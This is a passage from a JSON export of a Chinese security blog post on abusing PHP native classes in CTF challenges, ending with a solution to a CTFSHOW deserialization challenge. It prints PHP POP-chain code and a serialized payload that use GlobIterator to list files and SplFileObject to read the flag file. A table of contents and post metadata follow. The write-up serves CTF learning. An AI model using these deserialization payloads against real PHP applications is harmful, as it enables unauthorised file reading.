single-quoted-string\">'123'</span><span class=\"token punctuation\">;</span> \n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pop</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">#O:7:\"w_wuw_w\":3:&#123;s:3:\"aaa\";N;s:3:\"key\";O:5:\"gBoBg\":3:&#123;s:4:\"name\";s:1:\"1\";s:4:\"file\";s:3:\"/f*\";s:4:\"coos\";s:12:\"GlobIterator\";&#125;s:4:\"file\";s:3:\"123\";&#125;</span>\n</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080214943.png\" alt=\"image-20230408021427865\"></p>\n<p>疑似发现flag文件<code>f1agaaa</code>，尝试读取</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">gBoBg</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'/f1agaaa'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$coos</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'SplFileObject'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>   \n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">w_wuw_w</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$aaa</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$key</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$pop</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">w_wuw_w</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$pop</span><span class=\"token operator\">-></span><span class=\"token property\">key</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">gBoBg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$pop</span><span class=\"token operator\">-></span><span class=\"token property\">file</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'123'</span><span class=\"token punctuation\">;</span> \n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pop</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080219590.png\" alt=\"image-20230408021910522\"></p>\n<p>成功获取flag。</p>\n<h1 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h1><p><a href=\"https://johnfrod.top/%E5%AE%89%E5%85%A8/ctf-%E4%B8%AD-php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/\">https://johnfrod.top/%E5%AE%89%E5%85%A8/ctf-%E4%B8%AD-php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/</a></p>\n<p><a href=\"http://arsenetang.com/2021/10/29/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BPHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E8%BF%90%E7%94%A8/#%E5%88%A9%E7%94%A8SoapClient%E5%AE%9E%E7%8E%B0SSRF\">http://arsenetang.com/2021/10/29/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BPHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E8%BF%90%E7%94%A8/#%E5%88%A9%E7%94%A8SoapClient%E5%AE%9E%E7%8E%B0SSRF</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/356530.html\">https://www.freebuf.com/articles/web/356530.html</a></p>\n<p><a href=\"https://xz.aliyun.com/t/9293#toc-10\">https://xz.aliyun.com/t/9293#toc-10</a></p>\n","feature":true,"text":"前言周末看题，遇PHP原生类，坐牢，此前未学，故学，浅结，如下。 PHP原生类基础概念什么是原生类呢，接下来来简单介绍一下它。 PHP原生类就是在标准PHP库中已经封装好的类，而在其中，有些类具有一些功能，例如文件读取、目录遍历等，这就给了我们可乘之机，我们只需要实例化这些类，就...","link":"","photos":[],"count_time":{"symbolsCount":"21k","symbolsTime":"19 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"反序列化","slug":"反序列化","count":4,"path":"api/tags/反序列化.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#PHP%E5%8E%9F%E7%94%9F%E7%B1%BB\"><span class=\"toc-text\">PHP原生类</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5\"><span class=\"toc-text\">基础概念</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#XSS-By-Error-Exception\"><span class=\"toc-text\">XSS By Error&#x2F;Exception</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Error\"><span class=\"toc-text\">Error</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%89%8D%E6%8F%90\"><span class=\"toc-text\">前提</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">原理</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#demo\"><span class=\"toc-text\">demo</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Exception\"><span class=\"toc-text\">Exception</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%89%8D%E6%8F%90-1\"><span class=\"toc-text\">前提</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E7%90%86-1\"><span class=\"toc-text\">原理</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#demo-1\"><span class=\"toc-text\">demo</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SSRF-By-SoapClient\"><span class=\"toc-text\">SSRF By SoapClient</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%AE%9A%E4%B9%89\"><span class=\"toc-text\">定义</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#demo-2\"><span class=\"toc-text\">demo</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96\"><span class=\"toc-text\">文件读取</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#SplFileObject\"><span class=\"toc-text\">SplFileObject</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%AE%9A%E4%B9%89-1\"><span class=\"toc-text\">定义</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E7%90%86-2\"><span class=\"toc-text\">原理</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">简单利用</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%81%8D%E5%8E%86%E7%9B%AE%E5%BD%95\"><span class=\"toc-text\">遍历目录</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#FilesystemIterator\"><span class=\"toc-text\">FilesystemIterator</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%AE%9A%E4%B9%89-2\"><span class=\"toc-text\">定义</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E7%90%86-3\"><span class=\"toc-text\">原理</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8-1\"><span class=\"toc-text\">简单利用</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#demo-3\"><span class=\"toc-text\">demo</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#DirectoryIterator\"><span class=\"toc-text\">DirectoryIterator</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%AE%9A%E4%B9%89-3\"><span class=\"toc-text\">定义</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8-2\"><span class=\"toc-text\">简单利用</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#GlobIterator\"><span class=\"toc-text\">GlobIterator</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%AE%9A%E4%B9%89-4\"><span class=\"toc-text\">定义</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#open-basedir-BYpass\"><span class=\"toc-text\">open_basedir BYpass</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#CTF%E8%B5%9B%E9%A2%98%E5%AE%9E%E6%88%98\"><span class=\"toc-text\">CTF赛题实战</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#XSS\"><span class=\"toc-text\">XSS</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#BJDCTF-2nd-xss%E4%B9%8B%E5%85%89\"><span class=\"toc-text\">[BJDCTF 2nd]xss之光</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SSRF\"><span class=\"toc-text\">SSRF</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#CTFSHOW-web-259\"><span class=\"toc-text\">CTFSHOW web[259]</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%81%8D%E5%8E%86%E7%9B%AE%E5%BD%95-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96\"><span class=\"toc-text\">遍历目录+文件读取</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#CTFSHOW-%E6%84%9A%E4%BA%BA%E6%9D%AF-%E8%A2%AB%E9%81%97%E5%BF%98%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\"><span class=\"toc-text\">CTFSHOW 愚人杯[被遗忘的反序列化]</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE\"><span class=\"toc-text\">参考文献</span></a></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"内网靶场实战——ATT&CK实战系列（四）","uid":"6a98a1dbb5c5e5a32e4331613d5b5f80","slug":"内网靶场实战——ATT&CK实战系列（四）","date":"2023-04-11T17:32:20.000Z","updated":"2024-02-14T07:48:48.000Z","comments":true,"path":"api/articles/内网靶场实战——ATT&CK实战系列（四）.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304120134292.jpeg","text":"环境搭建环境地址如下： http://39.98.79.56/vuln/detail/6/ 接下来下载好后在VmWare中进行ovf导入即可，共计三个文件 接下来配置网络环境，在虚拟网络编辑器中添加两个网段 1、192.168.1.0 NAT模式 用于外网 2、192.168.1...","link":"","photos":[],"count_time":{"symbolsCount":"14k","symbolsTime":"13 mins."},"categories":[{"name":"内网","slug":"内网","count":12,"path":"api/categories/内网.json"}],"tags":[{"name":"内网","slug":"内网","count":13,"path":"api/tags/内网.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"内网渗透基础(一)","uid":"669ca80a1e42174aff287d7a7a620a36","slug":"内网基础","date":"2023-03-27T18:04:20.000Z","updated":"2024-02-14T07:48:40.000Z","comments":true,"path":"api/articles/内网基础.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080026781.jpeg","text":"内网基础概念内网的概念究竟什么是内网呢？《内网渗透攻防》中如是说 内网也指局域网，是指在某一区域由多台计算机互连而成的计算机组。 工作组在一个大型单位中，可能有成百上千台计算机，他们相互连接组成局域网，如果不进行分组，那么网络关系就会杂乱不堪，此时工作组的出现，成功解决了这个问题...","link":"","photos":[],"count_time":{"symbolsCount":"8.8k","symbolsTime":"8 mins."},"categories":[{"name":"内网","slug":"内网","count":12,"path":"api/categories/内网.json"}],"tags":[{"name":"内网","slug":"内网","count":13,"path":"api/tags/内网.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true}}